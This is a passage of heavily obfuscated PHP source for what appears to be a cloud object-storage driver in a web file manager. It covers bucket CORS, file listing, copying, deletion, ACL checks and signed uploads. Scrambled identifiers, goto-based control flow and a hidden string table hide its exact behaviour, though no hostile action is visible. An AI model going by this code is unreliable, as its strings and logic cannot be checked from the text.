$dè×¹×âù· - $A·æ¿Ç×Å¿; } if ($F¹°‹ÄÂ…“ <= 0) { return $D‘Ô£Í­‰õ[33]; } if ($A·æ¿Ç×Å¿ < 0 || $A·æ¿Ç×Å¿ >= $dè×¹×âù· || $F¹°‹ÄÂ…“ <= 0 || $F¹°‹ÄÂ…“ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\x69\x6c\x65\122\145\141\144\40\x65\x72\162\157\x72\x21\x20\x73\164\141\x72\164\x3d{$A·æ¿Ç×Å¿}\x3b\x6c\145\x6e\x67\164\x68\75{$F¹°‹ÄÂ…“}\x3b\x20\x73\x69\x7a\145\x3d{$dè×¹×âù·}\x3b"); } goto BÀ‘©£»“; EãÈàíŠ±İ: } private function log($B…øîíœŒö, $bøÖåÀ¿î) { $aÌô›ëø¢ =& $_SERVER[¿õñ]; $F­‘„Éïª¥ = timeFloat() - $this->timeStart; write_log(sprintf($aÌô›ëø¢[1227], $B…øîíœŒö, $this->info[$aÌô›ëø¢[28]], $F­‘„Éïª¥, $bøÖåÀ¿î), $aÌô›ëø¢[1188]); } } goto cÙ«ˆ©¬«Î; eáÕâ‘º¡Ñ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public function __construct($a’ˆ‡º™Ü) { parent::__construct(); include_once SDK_DIR . $_SERVER[¿õñ][1140]; $this->_init($a’ˆ‡º™Ü); } public function _init($BÂò†½ˆÀ„) { foreach ($BÂò†½ˆÀ„ as $FĞ…æëÁõ„ => $døù‘Ç†®) { if (isset($this->{$FĞ…æëÁõ„})) { $this->{$FĞ…æëÁõ„} = $døù‘Ç†®; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¿õñ][1141], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function setBucketCors() { goto f×¢²è¥ŒÇ; c„ÀŞßÚ£: $Aì¡ää¥Å©->addAllowedMethod($BŒ÷éñö–[1145]); $Aì¡ää¥Å©->addAllowedMethod($BŒ÷éñö–[1146]); $Aì¡ää¥Å©->addAllowedMethod($BŒ÷éñö–[150]); goto BÎ—„„ã; dìºË×Û†ë: $AÍ¤‚Ì¼‚ç->addRule($Aì¡ää¥Å©); try { $this->client->putBucketCors($this->bucket, $AÍ¤‚Ì¼‚ç); } catch (OSS\Core\OssException $c²îø›Ë¡¿) { return !1; } return !0; goto dİéš”¹‹ğ; BÎ—„„ã: $Aì¡ää¥Å©->setMaxAgeSeconds(600); $Aì¡ää¥Å©->addExposeHeader($BŒ÷éñö–[1147]); $Aì¡ää¥Å©->addAllowedHeader($BŒ÷éñö–[1142]); goto dìºË×Û†ë; CìÒŠ¤‹Ç‰: $Aì¡ää¥Å©->addAllowedOrigin($BŒ÷éñö–[1142]); $Aì¡ää¥Å©->addAllowedMethod($BŒ÷éñö–[1143]); $Aì¡ää¥Å©->addAllowedMethod($BŒ÷éñö–[1144]); goto c„ÀŞßÚ£; f×¢²è¥ŒÇ: $BŒ÷éñö– =& $_SERVER[¿õñ]; $AÍ¤‚Ì¼‚ç = new OSS\Model\CorsConfig(); $Aì¡ää¥Å© = new OSS\Model\CorsRule(); goto CìÒŠ¤‹Ç‰; dİéš”¹‹ğ: } public function getBucketCors() { goto cøçÖ¨ğğ¿; bÏ¤µæœ©©: return array($eàõÀìëÊ[172] => isset($cŞ‘Ş÷«[0]) ? $cŞ‘Ş÷«[0] : $eàõÀìëÊ[33], $eàõÀìëÊ[176] => $c®öó”½Œ, $eàõÀìëÊ[1148] => $eÊ®¿ÌŞ, $eàõÀìëÊ[1149] => isset($F¿¡¬ÊîôŠ[0]) ? $F¿¡¬ÊîôŠ[0] : $eàõÀìëÊ[33], $eàõÀìëÊ[174] => isset($Eœ»†Ê‰«™[0]) ? $Eœ»†Ê‰«™[0] : $eàõÀìëÊ[33]); goto A’×îÍ‚ëÖ; cøçÖ¨ğğ¿: $eàõÀìëÊ =& $_SERVER[¿õñ]; $fÎ†ŸĞÀï = null; try { $fÎ†ŸĞÀï = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $bÔÀµ«ÅÇ) { return null; } goto dê²œ›¸‚‘; dê²œ›¸‚‘: if (!$fÎ†ŸĞÀï || !($Bƒë©â°µ´ = $fÎ†ŸĞÀï->getRules())) { return null; } $cŞ‘Ş÷« = $Bƒë©â°µ´[0]->getAllowedOrigins(); $c®öó”½Œ = $Bƒë©â°µ´[0]->getAllowedMethods(); goto FÂŠ±ÒâÈØ; FÂŠ±ÒâÈØ: $eÊ®¿ÌŞ = $Bƒë©â°µ´[0]->getMaxAgeSeconds(); $F¿¡¬ÊîôŠ = $Bƒë©â°µ´[0]->getExposeHeaders(); $Eœ»†Ê‰«™ = $Bƒë©â°µ´[0]->getAllowedHeaders(); goto bÏ¤µæœ©©; A’×îÍ‚ëÖ: } public function isBucketCors() { goto fØõ¾ÓÛ; fØõ¾ÓÛ: $EŒ¥İŞË¸ =& $_SERVER[¿õñ]; $bèÍŒÑšÃ³ = $this->getBucketCors(); if (!$bèÍŒÑšÃ³ || !is_array($bèÍŒÑšÃ³)) { return !1; } goto B­÷êç³Ÿ; f˜Ú­™¥ß: $D¸°‡ªÔÙğ = array($EŒ¥İŞË¸[177], $EŒ¥İŞË¸[178], $EŒ¥İŞË¸[179], $EŒ¥İŞË¸[180], $EŒ¥İŞË¸[181]); $eÓøä¬Ù‡œ = array_diff($D¸°‡ªÔÙğ, $f¯‹ƒ¶—º¯); return empty($eÓøä¬Ù‡œ); goto Eš‚¿ó¿ÜØ; B­÷êç³Ÿ: if ($bèÍŒÑšÃ³[$EŒ¥İŞË¸[172]] != $EŒ¥İŞË¸[173] || $bèÍŒÑšÃ³[$EŒ¥İŞË¸[174]] != $EŒ¥İŞË¸[173]) { return !1; } $f¯‹ƒ¶—º¯ = array_map($EŒ¥İŞË¸[175], $bèÍŒÑšÃ³[$EŒ¥İŞË¸[176]]); if (!is_array($f¯‹ƒ¶—º¯)) { $f¯‹ƒ¶—º¯ = array(); } goto f˜Ú­™¥ß; Eš‚¿ó¿ÜØ: } public function mkfile($D¿õŞâß‰î, $eÂ˜á“óº‹ = '', $A’êà¨¤‡¤ = REPEAT_RENAME) { $a÷õ¥÷Ëä = $this->setContent($D¿õŞâß‰î, $eÂ˜á“óº‹); if ($a÷õ¥÷Ëä !== !1) { return $this->getPathOuter($D¿õŞâß‰î); } return !1; } public function mkdir($FŠøœĞàË, $eôŠİ‚éßÆ = REPEAT_SKIP) { if ($this->_isFolder($FŠøœĞàË)) { return $this->getPathOuter($FŠøœĞàË); } try { $this->client->createObjectDir($this->bucket, $FŠøœĞàË); } catch (OSS\Core\OssException $Dî±š˜·¿ï) { return !1; } return $this->getPathOuter($FŠøœĞàË); } private function fileList($bäã¥İÆ°®, $aùÒÚë»¹ = '', $fèª¢ İ» = 0) { goto DÏí¾©Ÿ§ö; DÏí¾©Ÿ§ö: $e˜…À—•Ï… =& $_SERVER[¿õñ]; $bäã¥İÆ°® = trim($bäã¥İÆ°®, $e˜…À—•Ï…[8]); $E“˜ÕÚÆš = empty($bäã¥İÆ°®) ? $e˜…À—•Ï…[33] : $bäã¥İÆ°® . $e˜…À—•Ï…[8]; goto aî‘·ßøàÊ; E­ù×‹ñã½: while (!0) { $c…¨ô±÷Ú = array($e˜…À—•Ï…[1150] => $aùÒÚë»¹, $e˜…À—•Ï…[183] => $E“˜ÕÚÆš, $e˜…À—•Ï…[1151] => $eñÓ¹ª˜Î, $e˜…À—•Ï…[1152] => $bùäê×ê‰¨); try { $fó–ß¸™ºù = $this->client->listObjects($this->bucket, $c…¨ô±÷Ú); } catch (OSS\Core\OssException $Aµ›ö†×—) { break; } $bùäê×ê‰¨ = $fó–ß¸™ºù->getNextMarker(); $Bƒà°ÃŠôš = $fó–ß¸™ºù->getObjectList(); $c‚Ò’Ğ¶ğ = $fó–ß¸™ºù->getPrefixList(); foreach ($Bƒà°ÃŠôš as $cïìèâËŞâ) { if ($cïìèâËŞâ->getKey() == $E“˜ÕÚÆš) { continue; } $B…œ‘îá = $cïìèâËŞâ->getKey(); if ($fèª¢ İ») { $B…œ‘îá = array($e˜…À—•Ï…[28] => $B…œ‘îá, $e˜…À—•Ï…[78] => $cïìèâËŞâ->getSize(), $e˜…À—•Ï…[187] => strtotime($cïìèâËŞâ->getLastModified())); } $D²¢¾Ğƒ[] = $B…œ‘îá; } foreach ($c‚Ò’Ğ¶ğ as $Bã³À¹¥) { $F“‰·—†˜[] = $Bã³À¹¥->getPrefix(); } if ($bùäê×ê‰¨ === $e˜…À—•Ï…[33]) { break; } } return array($e˜…À—•Ï…[75] => $F“‰·—†˜, $e˜…À—•Ï…[74] => $D²¢¾Ğƒ); goto AÇ„íèŒË ; aî‘·ßøàÊ: $bùäê×ê‰¨ = $e˜…À—•Ï…[33]; $eñÓ¹ª˜Î = 1000; $F“‰·—†˜ = $D²¢¾Ğƒ = array(); goto E­ù×‹ñã½; AÇ„íèŒË : } public function copyFile($B¿ĞÍºƒ­, $fãƒâô…Óã) { $A•·êƒÆ±Ï = $this->size($B¿ĞÍºƒ­); if ($A•·êƒÆ±Ï < 1024 * 1024 * 1024) { try { $E‘ì÷š‘Üİ = $this->client->copyObject($this->bucket, $B¿ĞÍºƒ­, $this->bucket, $fãƒâô…Óã); } catch (OSS\Core\OssException $eÑåÄ®Á£) { return !1; } return !0; } return $this->multiCopyObject($B¿ĞÍºƒ­, $fãƒâô…Óã, $A•·êƒÆ±Ï); } private function multiCopyObject($CÏÎÇç„Ş³, $aœ»•îµ¶é, $F®´âà“–à) { $bùƒÙÊšÛ³ =& $_SERVER[¿õñ]; try { goto e—Áì­º¨î; Cí˜§µÄÁĞ: $cä¿£öã°” = $this->osChunkSize(); $dÁ¬ÆÏâõ† = $this->client->generateMultiuploadParts($F®´âà“–à, $cä¿£öã°”); foreach ($dÁ¬ÆÏâõ† as $c‚Óóé æò => $a½¶æİÛæÜ) { $cÅÙù–§å = $CŞ†«§ÏÅç + (int) $a½¶æİÛæÜ[$bùƒÙÊšÛ³[1154]]; $Aº–Ã¡¹× = (int) $a½¶æİÛæÜ[$bùƒÙÊšÛ³[322]] + $cÅÙù–§å - 1; $Aõë½ˆœ›ä = array($bùƒÙÊšÛ³[1155] => $cÅÙù–§å, $bùƒÙÊšÛ³[1156] => $Aº–Ã¡¹×); $CĞ÷ÛÊ¾„[] = $this->client->uploadPartCopy($this->bucket, $CÏÎÇç„Ş³, $this->bucket, $aœ»•îµ¶é, $c”Üì‹İ, $DÚ«Í×Ë„ , $Aõë½ˆœ›ä); $c”Üì‹İ = $c”Üì‹İ + 1; } goto aÄ›–âßøÎ; e—Áì­º¨î: $a‡˜Å†éµ = array(); if ($D‰ƒ¿°Şº± = $this->hashMd5($CÏÎÇç„Ş³)) { $a‡˜Å†éµ = array(OSS\OssClient::OSS_HEADERS => array($bùƒÙÊšÛ³[1153] => $D‰ƒ¿°Şº±)); } $DÚ«Í×Ë„  = $this->client->initiateMultipartUpload($this->bucket, $aœ»•îµ¶é, $a‡˜Å†éµ); goto CÄ¤ê¥¬‚ï; aÄ›–âßøÎ: $D“‘ĞŸØ° = array(); foreach ($CĞ÷ÛÊ¾„ as $c‚Óóé æò => $E‚¬¶ñŠíì) { $D“‘ĞŸØ°[] = array($bùƒÙÊšÛ³[1157] => $c‚Óóé æò + 1, $bùƒÙÊšÛ³[1158] => $E‚¬¶ñŠíì); } $FÖ¢°ƒ²²Æ = $this->client->completeMultipartUpload($this->bucket, $aœ»•îµ¶é, $DÚ«Í×Ë„ , $D“‘ĞŸØ°); goto EÇÏòÉ‡Š•; CÄ¤ê¥¬‚ï: $c”Üì‹İ = 1; $CŞ†«§ÏÅç = 0; $CĞ÷ÛÊ¾„ = array(); goto Cí˜§µÄÁĞ; EÇÏòÉ‡Š•: } catch (OSS\Core\OssException $CÙÖ³öİã†) { return !1; } return !0; } public function moveFile($FÌ·ê÷ƒŒÊ, $c‘Š‚Œ’ôõ) { if ($this->copyFile($FÌ·ê÷ƒŒÊ, $c‘Š‚Œ’ôõ)) { $this->remove($FÌ·ê÷ƒŒÊ); return !0; } return !1; } public function delFile($d°Ÿï­Ã) { try { $this->client->deleteObject($this->bucket, $d°Ÿï­Ã); } catch (OSS\Core\OssException $CÃ‹‚ßæÔ) { return !1; } return !0; } public function delFolder($c™–Ñ«É¯) { $FÆä‚Ó»øë =& $_SERVER[¿õñ]; $fõœÔºÛ÷ª = $this->fileList($c™–Ñ«É¯); if (!empty($c™–Ñ«É¯) && !in_array(trim($c™–Ñ«É¯, $FÆä‚Ó»øë[8]) . $FÆä‚Ó»øë[8], $fõœÔºÛ÷ª[$FÆä‚Ó»øë[74]])) { $fõœÔºÛ÷ª[$FÆä‚Ó»øë[74]][] = trim($c™–Ñ«É¯, $FÆä‚Ó»øë[8]) . $FÆä‚Ó»øë[8]; } foreach (array_chunk($fõœÔºÛ÷ª[$FÆä‚Ó»øë[74]], 1000) as $CÓ¦îÔÇ» ) { try { $this->client->deleteObjects($this->bucket, $CÓ¦îÔÇ» ); } catch (OSS\Core\OssException $dªß°Á) { continue; } } return !0; } public function rename($e¢ô…‘È‰, $A™¥«¡™òó) { return $this->renameObject($e¢ô…‘È‰, $A™¥«¡™òó); } private function fileInfo($B¹ËÑ–Ò®, $f´èîÈ÷ = array()) { goto eªĞóŞæÍ…; a¨¸ìÃ²¢™: return $F½’‘¨´‚†; goto Bß·£™„È¶; eªĞóŞæÍ…: $Bšì¼ŒÙ®å =& $_SERVER[¿õñ]; $F½’‘¨´‚† = array($Bšì¼ŒÙ®å[28] => $this->pathThis($B¹ËÑ–Ò®), $Bšì¼ŒÙ®å[76] => $this->getPathOuter($B¹ËÑ–Ò®), $Bšì¼ŒÙ®å[29] => $Bšì¼ŒÙ®å[164], $Bšì¼ŒÙ®å[184] => $Bšì¼ŒÙ®å[50], $Bšì¼ŒÙ®å[106] => $Bšì¼ŒÙ®å[50], $Bšì¼ŒÙ®å[78] => 0, $Bšì¼ŒÙ®å[157] => $this->ext($B¹ËÑ–Ò®), $Bšì¼ŒÙ®å[185] => !0, $Bšì¼ŒÙ®å[186] => !0); if (empty($f´èîÈ÷)) { $e®Ù¶ã‹¨Ç = $this->objectMeta($B¹ËÑ–Ò®); if (!$e®Ù¶ã‹¨Ç) { return $F½’‘¨´‚†; } $f´èîÈ÷ = array($Bšì¼ŒÙ®å[106] => strtotime($e®Ù¶ã‹¨Ç[$Bšì¼ŒÙ®å[1159]]), $Bšì¼ŒÙ®å[78] => $e®Ù¶ã‹¨Ç[$Bšì¼ŒÙ®å[1160]] + 0); } goto Dƒ›ƒÎÛ¿³; Dƒ›ƒÎÛ¿³: if (isset($f´èîÈ÷[$Bšì¼ŒÙ®å[78]])) { $F½’‘¨´‚†[$Bšì¼ŒÙ®å[78]] = $f´èîÈ÷[$Bšì¼ŒÙ®å[78]]; } if (isset($f´èîÈ÷[$Bšì¼ŒÙ®å[106]])) { $F½’‘¨´‚†[$Bšì¼ŒÙ®å[106]] = $f´èîÈ÷[$Bšì¼ŒÙ®å[106]]; } if (isset($f´èîÈ÷[$Bšì¼ŒÙ®å[187]]) && !trim($F½’‘¨´‚†[$Bšì¼ŒÙ®å[106]])) { $F½’‘¨´‚†[$Bšì¼ŒÙ®å[106]] = $f´èîÈ÷[$Bšì¼ŒÙ®å[187]]; } goto a¨¸ìÃ²¢™; Bß·£™„È¶: } private function folderInfo($dÅ‡™ÑÂ²È, $dß¸çÓˆè’ = array()) { $F²Û‡…í—õ =& $_SERVER[¿õñ]; $F¹Å•ÓçøŒ = array($F²Û‡…í—õ[28] => $this->pathThis($dÅ‡™ÑÂ²È), $F²Û‡…í—õ[76] => $this->getPathOuter($F²Û‡…í—õ[8] . $dÅ‡™ÑÂ²È), $F²Û‡…í—õ[29] => $F²Û‡…í—õ[77], $F²Û‡…í—õ[184] => $F²Û‡…í—õ[50], $F²Û‡…í—õ[106] => $F²Û‡…í—õ[50], $F²Û‡…í—õ[185] => !0, $F²Û‡…í—õ[186] => !0); if (empty($dß¸çÓˆè’)) { $dÅ‡™ÑÂ²È = rtrim($dÅ‡™ÑÂ²È, $F²Û‡…í—õ[8]) . $F²Û‡…í—õ[8]; $Fà¢˜Ü¾ŒÊ = $this->objectMeta($dÅ‡™ÑÂ²È); if (!$Fà¢˜Ü¾ŒÊ) { return $F¹Å•ÓçøŒ; } $dß¸çÓˆè’ = array($F²Û‡…í—õ[184] => $Fà¢˜Ü¾ŒÊ[$F²Û‡…í—õ[1161]][$F²Û‡…í—õ[1162]], $F²Û‡…í—õ[106] => strtotime($Fà¢˜Ü¾ŒÊ[$F²Û‡…í—õ[1159]])); } if (isset($dß¸çÓˆè’[$F²Û‡…í—õ[106]])) { $F¹Å•ÓçøŒ[$F²Û‡…í—õ[106]] = $dß¸çÓˆè’[$F²Û‡…í—õ[106]]; } if (isset($dß¸çÓˆè’[$F²Û‡…í—õ[184]])) { $F¹Å•ÓçøŒ[$F²Û‡…í—õ[184]] = $dß¸çÓˆè’[$F²Û‡…í—õ[184]]; } return $F¹Å•ÓçøŒ; } public function listPath($EÄÚƒŒ†¨…, $eçË†ò˜À» = false) { $A…ƒÛ²Ş†æ =& $_SERVER[¿õñ]; $eÑ§Ë‘‡ï = $this->fileList($EÄÚƒŒ†¨…, $A…ƒÛ²Ş†æ[8], !0); foreach ($eÑ§Ë‘‡ï[$A…ƒÛ²Ş†æ[75]] as $D‡ïôñØÍ· => $a‡ïÄ”ÆÀŒ) { $eÑ§Ë‘‡ï[$A…ƒÛ²Ş†æ[75]][$D‡ïôñØÍ·] = $this->folderInfo($a‡ïÄ”ÆÀŒ, $a‡ïÄ”ÆÀŒ); } foreach ($eÑ§Ë‘‡ï[$A…ƒÛ²Ş†æ[74]] as $D‡ïôñØÍ· => $a‡ïÄ”ÆÀŒ) { $eÑ§Ë‘‡ï[$A…ƒÛ²Ş†æ[74]][$D‡ïôñØÍ·] = $this->fileInfo($a‡ïÄ”ÆÀŒ[$A…ƒÛ²Ş†æ[28]], $a‡ïÄ”ÆÀŒ); } return $eÑ§Ë‘‡ï; } public function has($f—ôàùèù­, $E„‰ñí‚¥© = false, $EÅ¸ÓÙØê = true) { goto c­®µÉ‡£; D³¢¡£´••: return !1; goto c©ªÆÎÉÍ; c­®µÉ‡£: $eŞà¬ÏìÒ =& $_SERVER[¿õñ]; $f—ôàùèù­ = trim($f—ôàùèù­, $eŞà¬ÏìÒ[8]); $Eá„É¶‹ó = empty($f—ôàùèù­) ? $eŞà¬ÏìÒ[33] : $f—ôàùèù­ . $eŞà¬ÏìÒ[8]; goto Fâšôà„ÇÉ; cø½ª§Şİ“: $dÍÚøËÚà‡ = 0; while (!0) { $C¢Äô‡à–± = array($eŞà¬ÏìÒ[1150] => $eŞà¬ÏìÒ[8], $eŞà¬ÏìÒ[183] => $Eá„É¶‹ó, $eŞà¬ÏìÒ[1151] => $BÃ¥»Î¼ˆ¹, $eŞà¬ÏìÒ[1152] => $aÒ¯¸¡ŞÛõ); try { $D‡–¹ßŒí— = $this->client->listObjects($this->bucket, $C¢Äô‡à–±); } catch (OSS\Core\OssException $A‡Ù¹øìï±) { break; } $aÒ¯¸¡ŞÛõ = $D‡–¹ßŒí—->getNextMarker(); $Açƒî®¶ ª = $D‡–¹ßŒí—->getObjectList(); $aá«Ïñ½Ò… = $D‡–¹ßŒí—->getPrefixList(); if ($E„‰ñí‚¥©) { if (count($Açƒî®¶ ª) > 1 || count($Açƒî®¶ ª) == 1 && $Açƒî®¶ ª[0]->getKey() != $Eá„É¶‹ó) { $CõØµñ¨Úî += count($Açƒî®¶ ª) - 1; } if (!empty($aá«Ïñ½Ò…)) { $dÍÚøËÚà‡ += count($aá«Ïñ½Ò…); } if ($aÒ¯¸¡ŞÛõ === $eŞà¬ÏìÒ[33]) { break; } continue; } if ($EÅ¸ÓÙØê) { if (!empty($Açƒî®¶ ª)) { if (count($Açƒî®¶ ª) > 1 || $Açƒî®¶ ª[0]->getKey() != $Eá„É¶‹ó) { return !0; } } } else { if (!empty($aá«Ïñ½Ò…)) { return !0; } } if ($aÒ¯¸¡ŞÛõ === $eŞà¬ÏìÒ[33]) { break; } } if ($E„‰ñí‚¥©) { return array($eŞà¬ÏìÒ[188] => $CõØµñ¨Úî, $eŞà¬ÏìÒ[189] => $dÍÚøËÚà‡); } goto D³¢¡£´••; Fâšôà„ÇÉ: $aÒ¯¸¡ŞÛõ = $eŞà¬ÏìÒ[33]; $BÃ¥»Î¼ˆ¹ = 500; $CõØµñ¨Úî = 0; goto cø½ª§Şİ“; c©ªÆÎÉÍ: } public function listAll($F¼ãÉßÛ’İ) { $d¢‚•£…³ =& $_SERVER[¿õñ]; $FÚ×³ºíŒ = $this->fileList($F¼ãÉßÛ’İ, $d¢‚•£…³[33], !0); $Bè™‚Î…Ê = array(); foreach ($FÚ×³ºíŒ[$d¢‚•£…³[74]] as $E«Áˆ¯Ú¬) { $Bè™‚Î…Ê[$E«Áˆ¯Ú¬[$d¢‚•£…³[28]]] = $E«Áˆ¯Ú¬[$d¢‚•£…³[78]]; } return $this->listAllFiles($F¼ãÉßÛ’İ, array_keys($Bè™‚Î…Ê), $Bè™‚Î…Ê); } public function canRead($B¦ˆÚ²¼é) { $e™øäª±‚µ =& $_SERVER[¿õñ]; $b²ŸµÑ°İÉ = $this->pathAcl($B¦ˆÚ²¼é); return $b²ŸµÑ°İÉ == $e™øäª±‚µ[1163] || $b²ŸµÑ°İÉ == $e™øäª±‚µ[483] ? !0 : !1; } public function canWrite($CëÇÂÍ¤¬¬) { $b–£’ì›Ó§ = $this->pathAcl($CëÇÂÍ¤¬¬); return $b–£’ì›Ó§ == $_SERVER[¿õñ][483] ? !0 : !1; } public function pathAcl($FÆ¯¹‚«Ü) { goto b£ƒ»ÍÃ°½; FÛÙÆÚ—í®: return $A‘†ˆÎ‚†×; goto Dæ—ÀÏ¼‚Œ; b£ƒ»ÍÃ°½: $eÉ±É£Ö‘ß =& $_SERVER[¿õñ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $AŠò–Õõƒø = $this->client->getObjectAcl($this->bucket, $FÆ¯¹‚«Ü); } catch (OSS\Core\OssException $BÈ‰ºè²Èî) { return !1; } goto cÒ Û¹¶Ê; cÒ Û¹¶Ê: $A‘†ˆÎ‚†× = $AŠò–Õõƒø == $eÉ±É£Ö‘ß[34] ? $this->bucketAcl : $AŠò–Õõƒø; if ($A‘†ˆÎ‚†× == $eÉ±É£Ö‘ß[1164]) { return $eÉ±É£Ö‘ß[1163]; } if ($A‘†ˆÎ‚†× == $eÉ±É£Ö‘ß[1165]) { return $eÉ±É£Ö‘ß[483]; } goto FÛÙÆÚ—í®; Dæ—ÀÏ¼‚Œ: } private function chmodPath($Bˆ¡Œã¶¹™, $AÑ›Ä¾Òğ† = '') { $e•‘Ü†¦’ =& $_SERVER[¿õñ]; $DĞ§…”˜Ö¹ = empty($AÑ›Ä¾Òğ†) ? $e•‘Ü†¦’[1165] : $AÑ›Ä¾Òğ†; $e²ƒ†İóˆ = array($e•‘Ü†¦’[34], $e•‘Ü†¦’[182], $e•‘Ü†¦’[1164], $e•‘Ü†¦’[1165]); if (!in_array($DĞ§…”˜Ö¹, $e²ƒ†İóˆ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $Bˆ¡Œã¶¹™, $DĞ§…”˜Ö¹); } catch (OSS\Core\OssException $fŞ®”åÇàá) { return !1; } return !0; } public function getContent($fäœØÛÄŠÄ) { return $this->fileSubstr($fäœØÛÄŠÄ, -1); } public function setContent($C£ŒØç¿à, $D§¹…›Í…í = '') { $F£¥²¹˜ì =& $_SERVER[¿õñ]; try { $E–Û¼ÔÏ¾¯ = $this->trafficLimit($F£¥²¹˜ì[1166]); $e†ƒà²¾„ = $this->client->putObject($this->bucket, $C£ŒØç¿à, $D§¹…›Í…í, $E–Û¼ÔÏ¾¯); } catch (OSS\Core\OssException $aÂâÜ¸“ñ·) { return !1; } $Cîš–æ‰ŒÂ = array($F£¥²¹˜ì[1153] => trim($e†ƒà²¾„[$F£¥²¹˜ì[1167]], $F£¥²¹˜ì[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($C£ŒØç¿à))); $this->updateObjMeta($C£ŒØç¿à, $Cîš–æ‰ŒÂ); return isset($e†ƒà²¾„[$F£¥²¹˜ì[1168]][$F£¥²¹˜ì[1114]]) ? (int) $e†ƒà²¾„[$F£¥²¹˜ì[1168]][$F£¥²¹˜ì[1114]] : strlen($e†ƒà²¾„); } private function updateObjMeta($eËŠ›ìÒì, $FÌğë–¡Ã) { try { $açÊ®Öãâ = array(OSS\OssClient::OSS_HEADERS => $FÌğë–¡Ã); $this->client->copyObject($this->bucket, $eËŠ›ìÒì, $this->bucket, $eËŠ›ìÒì, $açÊ®Öãâ); } catch (OSS\Core\OssException $cÕ—ñ’”­) { return !1; } return !0; } public function upload($d§Õ¥ÔòÁë, $C—‡ËôÀ , $Bå†ÅÃš­Í = false, $D­ ¬òßõ† = REPEAT_REPLACE) { $bŒÄÁÜÁ§Æ =& $_SERVER[¿õñ]; $AºÀØÁ·õ® = trim($d§Õ¥ÔòÁë, $bŒÄÁÜÁ§Æ[8]); $E³İ‰‘¥ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($bŒÄÁÜÁ§Æ[1153] => @md5_file($C—‡ËôÀ )), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($d§Õ¥ÔòÁë))); $E³İ‰‘¥ = $this->trafficLimit($bŒÄÁÜÁ§Æ[1166], $E³İ‰‘¥); try { $this->client->multiuploadFile($this->bucket, $AºÀØÁ·õ®, $C—‡ËôÀ , $E³İ‰‘¥); } catch (OSS\Core\OssException $bõÍ‹Öø¯²) { return !1; } return $this->getPathOuter($d§Õ¥ÔòÁë); } public function getHost() { $aŞê¶Ã½ =& $_SERVER[¿õñ]; $cÓÖš¡…‡ = explode($aŞê¶Ã½[168], parent::getHost()); return $cÓÖš¡…‡[0] . $aŞê¶Ã½[168] . $this->bucket . $aŞê¶Ã½[92] . $cÓÖš¡…‡[1]; } public function uploadFormData($DÓôµéó´¸, $C³Í¤§Ãˆö = 3600) { goto fó÷Ñ§‚; EÇ‘à³Š¶¡: $fñ‰¨§Ñ = date($dÌ‹ŸØ…[1169], time() + $Aª¼ÏŸ—Ù¾); $Aç¸–—ááÅ = new DateTime($fñ‰¨§Ñ); $bÊô—™ƒ–ì = $Aç¸–—ááÅ->format(DateTime::ISO8601); goto F×‹…·ß¤Š; B‹“…©Îì‚: $BâÊæÛ³Š° = base64_encode(hash_hmac($dÌ‹ŸØ…[215], $DÙ”ğ†¢ì±, $this->secret, !0)); $eÂŒˆÍ‡ = array($dÌ‹ŸØ…[1084] => $DÙ”ğ†¢ì±, $dÌ‹ŸØ…[1172] => $this->accessKey, $dÌ‹ŸØ…[1080] => $dÌ‹ŸØ…[1072], $dÌ‹ŸØ…[1173] => $BâÊæÛ³Š°, $dÌ‹ŸØ…[166] => $EÇã…†‡©À); $eÂŒˆÍ‡ = $this->trafficLimit($dÌ‹ŸØ…[1166], $eÂŒˆÍ‡); goto eï†âš„†; eï†âš„†: return $eÂŒˆÍ‡; goto DÛ½ßòµ”; fó÷Ñ§‚: $dÌ‹ŸØ… =& $_SERVER[¿õñ]; if (!($EÇã…†‡©À = $this->getHost())) { return !1; } $Aª¼ÏŸ—Ù¾ = $C³Í¤§Ãˆö; goto EÇ‘à³Š¶¡; B½ÓÔ®†–ç: $Fô«¡Ø¯šÏ = $this->pathFather($DÓôµéó´¸); $e£è‚ƒĞ˜ = array($dÌ‹ŸØ…[1074] => $bÊô—™ƒ–ì, $dÌ‹ŸØ…[1075] => array(array($dÌ‹ŸØ…[1171], 0, $cÖí§æ¹×Û), array($dÌ‹ŸØ…[1078], $dÌ‹ŸØ…[1079], $Fô«¡Ø¯šÏ))); $DÙ”ğ†¢ì± = base64_encode(json_encode($e£è‚ƒĞ˜)); goto B‹“…©Îì‚; F×‹…·ß¤Š: $Fàç…œœÃ = strpos($bÊô—™ƒ–ì, $dÌ‹ŸØ…[281]); $bÊô—™ƒ–ì = substr($bÊô—™ƒ–ì, 0, $Fàç…œœÃ) . $dÌ‹ŸØ…[1170]; $cÖí§æ¹×Û = 1048576000 * 5; goto B½ÓÔ®†–ç; DÛ½ßòµ”: } public function multiUploadFormData($cœÖ£©ïæÚ, $B…°ÙËÌš = 3600) { $fÀŠ°æ›’Í =& $_SERVER[¿õñ]; if (!($aÕÊØ¿»ÖÜ = $this->getHost())) { return !1; } $F…‚™‡°› = $this->trafficLimit($fÀŠ°æ›’Í[1166]); $b¦Şåµ¸¹¬ = $this->client->initiateMultipartUpload($this->bucket, $cœÖ£©ïæÚ, $F…‚™‡°›); return array($fÀŠ°æ›’Í[206] => $b¦Şåµ¸¹¬, $fÀŠ°æ›’Í[166] => $aÕÊØ¿»ÖÜ . $fÀŠ°æ›’Í[8] . $this->pathEncode($cœÖ£©ïæÚ), $fÀŠ°æ›’Í[207] => gmdate($fÀŠ°æ›’Í[1174]), $fÀŠ°æ›’Í[88] => $cœÖ£©ïæÚ); } public function multiUploadAuthData($båöÌ…”ƒ, $f¸¨›ÏÛ· = array()) { goto d´¡¥ Ú³; Fïê¡ÅùÖµ: if (!empty($f¸¨›ÏÛ·[$B„Şì¬ÚğÕ[1176]])) { $dæµÉÀùŸ¸ 